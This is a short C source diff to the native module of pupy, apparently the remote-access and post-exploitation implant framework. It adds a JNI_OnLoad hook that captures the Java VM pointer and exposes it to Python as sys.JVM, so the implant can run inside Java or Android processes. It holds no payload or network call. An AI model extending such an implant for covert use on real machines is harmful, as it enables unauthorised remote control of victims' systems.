@@ -25,14 +25,27 @@ int linux_inject_main(int argc, char **argv);
 
 #include "revision.h"
 
-
 static const char module_doc[] = "Builtins utilities for pupy";
 
 static const char pupy_config[65536]="####---PUPY_CONFIG_COMES_HERE---####\n";
 
 static PyObject *ExecError;
 
+static void * __JVM = NULL;
+
 #include "lzmaunpack.c"
+
+int JNI_OnLoad(void *vm, void *reserved) {
+    dprint("JVM provided: %p\n", vm);
+
+    __JVM = vm;
+
+	if (PySys_SetObject != NULL) {
+		PySys_SetObject("JVM", PyCapsule_New(__JVM, "JVM", NULL));
+	}
+
+    return 0x00010006;
+}
 
 static PyObject *Py_get_modules(PyObject *self, PyObject *args)
 {
@@ -306,8 +319,8 @@ static PyMethodDef methods[] = {
 };
 
 DL_EXPORT(void)
-initpupy(void)
-{
+initpupy(void) {
+
     PyObject *pupy = Py_InitModule3("pupy", methods, (char *) module_doc);
     if (!pupy) {
         return;
@@ -317,4 +330,9 @@ initpupy(void)
     ExecError = PyErr_NewException("pupy.error", NULL, NULL);
     Py_INCREF(ExecError);
     PyModule_AddObject(pupy, "error", ExecError);
+
+    if (__JVM) {
+		dprint("Assign sys.JVM <- %p\n", __JVM);
+		PySys_SetObject("JVM", PyCapsule_New(__JVM, "JVM", NULL));
+	}
 }
